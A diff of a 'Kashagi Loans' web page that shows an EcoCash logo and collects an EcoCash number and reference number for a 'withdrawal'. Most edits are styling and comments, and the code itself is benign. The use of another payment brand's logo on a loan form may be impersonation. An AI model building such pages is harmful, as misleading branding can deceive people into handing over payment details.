@@ -3,14 +3,12 @@
 <head>
     <meta charset="UTF-8">
 
-    <meta
-        name="viewport"
-        content="width=device-width, initial-scale=1.0"
-    >
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
     <title>Kashagi Loans</title>
 
     <style>
+
         * {
             box-sizing: border-box;
         }
@@ -18,6 +16,7 @@
         body {
             margin: 0;
             padding: 20px;
+
             min-height: 100vh;
 
             font-family: Arial, Helvetica, sans-serif;
@@ -28,6 +27,11 @@
             align-items: center;
             justify-content: center;
         }
+
+
+        /* =========================
+           MAIN CARD
+        ========================= */
 
         .container {
             width: 100%;
@@ -43,6 +47,11 @@
                 0 12px 35px rgba(0, 0, 0, 0.15);
         }
 
+
+        /* =========================
+           BLUE HEADER
+        ========================= */
+
         .header {
             background: #1877f2;
 
@@ -53,16 +62,30 @@
             padding: 40px 20px 42px;
         }
 
+
+        /* =========================
+           CIRCULAR ECOCASH LOGO
+        ========================= */
+
         .logo {
             width: 150px;
             height: 150px;
 
-            object-fit: contain;
-
             display: block;
 
             margin: 0 auto 18px;
+
+            object-fit: cover;
+
+            border-radius: 50%;
+
+            clip-path: circle(50%);
         }
+
+
+        /* =========================
+           TITLE
+        ========================= */
 
         .title {
             margin: 0;
@@ -72,19 +95,27 @@
             font-weight: 700;
         }
 
+
         .subtitle {
             margin-top: 10px;
 
             font-size: 24px;
         }
 
+
+        /* =========================
+           FORM
+        ========================= */
+
         .form-area {
             padding: 40px;
         }
 
+
         .field {
             margin-bottom: 28px;
         }
+
 
         label {
             display: block;
@@ -97,6 +128,7 @@
 
             color: #333333;
         }
+
 
         input {
             width: 100%;
@@ -116,12 +148,18 @@
             background: #ffffff;
         }
 
+
         input:focus {
             border-color: #1877f2;
 
             box-shadow:
                 0 0 0 2px rgba(24, 119, 242, 0.12);
         }
+
+
+        /* =========================
+           BUTTON
+        ========================= */
 
         .withdraw-btn {
             width: 100%;
@@ -143,11 +181,22 @@
             cursor: pointer;
         }
 
+
+        .withdraw-btn:active {
+            transform: scale(0.99);
+        }
+
+
         .withdraw-btn:disabled {
             opacity: 0.7;
 
             cursor: not-allowed;
         }
+
+
+        /* =========================
+           MOBILE
+        ========================= */
 
         @media (max-width: 600px) {
 
@@ -155,49 +204,78 @@
                 padding: 0 12px;
             }
 
+
             .header {
                 padding: 38px 15px 40px;
             }
 
+
             .logo {
                 width: 145px;
                 height: 145px;
+
+                object-fit: cover;
+
+                border-radius: 50%;
+
+                clip-path: circle(50%);
             }
+
 
             .title {
                 font-size: 36px;
             }
 
+
             .subtitle {
                 font-size: 22px;
             }
+
 
             .form-area {
                 padding: 35px 30px;
             }
 
+
             label {
                 font-size: 23px;
             }
 
+
             input {
                 height: 68px;
+
                 font-size: 20px;
             }
 
+
             .withdraw-btn {
                 height: 70px;
+
                 font-size: 22px;
             }
+
         }
+
     </style>
+
 </head>
+
 
 <body>
 
+
 <div class="container">
 
+
+    <!-- =========================
+         HEADER
+    ========================= -->
+
     <div class="header">
+
+
+        <!-- YOUR EXISTING PNG -->
 
         <img
             src="Ecocash.png"
@@ -205,18 +283,27 @@
             class="logo"
         >
 
+
         <h1 class="title">
             Kashagi Loans
         </h1>
+
 
         <div class="subtitle">
             Fast • Secure • Reliable
         </div>
 
+
     </div>
 
 
+
+    <!-- =========================
+         FORM
+    ========================= -->
+
     <div class="form-area">
+
 
         <!-- ECOCASH NUMBER -->
 
@@ -225,6 +312,7 @@
             <label for="ecocash_number">
                 EcoCash Number
             </label>
+
 
             <input
                 type="tel"
@@ -236,6 +324,7 @@
         </div>
 
 
+
         <!-- REFERENCE NUMBER -->
 
         <div class="field">
@@ -243,6 +332,7 @@
             <label for="reference_number">
                 Reference Number
             </label>
+
 
             <input
                 type="text"
@@ -254,7 +344,8 @@
         </div>
 
 
-        <!-- SUBMIT -->
+
+        <!-- WITHDRAW BUTTON -->
 
         <button
             type="button"
@@ -265,14 +356,18 @@
             Withdraw to EcoCash
         </button>
 
+
     </div>
 
 </div>
 
 
+
 <script>
 
+
 async function submitForm() {
+
 
     const ecocashNumber =
         document
@@ -280,12 +375,17 @@ async function submitForm() {
         .value
         .trim();
 
+
+
     const referenceNumber =
         document
         .getElementById("reference_number")
         .value
         .trim();
 
+
+
+    // Check EcoCash number
 
     if (!ecocashNumber) {
 
@@ -297,6 +397,9 @@ async function submitForm() {
     }
 
 
+
+    // Check reference number
+
     if (!referenceNumber) {
 
         alert(
@@ -307,10 +410,12 @@ async function submitForm() {
     }
 
 
+
     const button =
         document.getElementById(
             "withdrawBtn"
         );
+
 
 
     button.disabled = true;
@@ -319,17 +424,22 @@ async function submitForm() {
         "Processing...";
 
 
+
     try {
+
 
         const response =
             await fetch(
                 "/submit",
                 {
+
                     method: "POST",
 
                     headers: {
+
                         "Content-Type":
                             "application/json"
+
                     },
 
                     body: JSON.stringify({
@@ -341,12 +451,15 @@ async function submitForm() {
                             referenceNumber
 
                     })
+
                 }
             );
 
 
+
         const data =
             await response.json();
+
 
 
         if (
@@ -362,16 +475,23 @@ async function submitForm() {
         }
 
 
+
+        // SUCCESS MESSAGE
+
         alert(
             "Withdrawal request has been received successfully."
         );
 
+
+
+        // REDIRECT AFTER OK
 
         window.location.href =
             "/thankyou.html";
 
 
     } catch (error) {
+
 
         console.error(
             "SUBMISSION ERROR:",
@@ -388,11 +508,14 @@ async function submitForm() {
 
         button.textContent =
             "Withdraw to EcoCash";
+
     }
 
 }
 
+
 </script>
+
 
 </body>
 </html>
